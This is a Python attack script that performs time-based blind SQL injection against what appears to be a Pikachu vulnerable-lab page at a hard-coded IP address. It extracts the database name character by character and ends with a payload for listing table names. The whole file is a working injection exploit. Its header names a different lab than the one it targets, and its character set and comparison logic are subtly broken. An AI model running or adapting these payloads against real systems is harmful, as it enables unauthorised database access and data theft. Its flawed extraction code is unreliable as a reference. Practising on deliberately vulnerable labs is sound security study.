# coding:utf-8
# Author:LSA
# Description:Time based sqli script for sqli-labs less 6
# Data:20180108


import requests
import time
import string
import sys

headers = {"user-agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)"}

chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'

database = ''

global length

for l in range(1, 20):
    lengthUrl = "http://222.186.175.249:10000/pikachu/vul/sqli/sqli_blind_t.php?name=kobe'"+" and if(length(database())>{0},1,sleep(3))--+&submit=%E6%9F%A5%E8%AF%A2"
    lengthUrlFormat = lengthUrl.format(l)
    start_time0 = time.time()
    rsp0 = requests.get(lengthUrlFormat, headers=headers)
    if time.time() - start_time0 > 2.5:
        print('database length is ' + str(l))
        global length
        length = l
        break
    else:
        pass

for i in range(1, length + 1):

    for char in chars:
        charAscii = ord(char)

        url = "http://222.186.175.249:10000/pikachu/vul/sqli/sqli_blind_t.php?name=kobe'"+ "and if(ascii(substr(database(),{0},1))>{1},1,sleep(3))--+ &submit=%E6%9F%A5%E8%AF%A2"
        urlformat = url.format(i, charAscii)

        start_time = time.time()

        rsp = requests.get(urlformat, headers=headers)

        if time.time() - start_time > 2.5:
            database += char
            print('database: ', database)
            break
        else:
            pass

print('database is ' + database)


and if(ascii(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1))>101,1,sleep(3))--+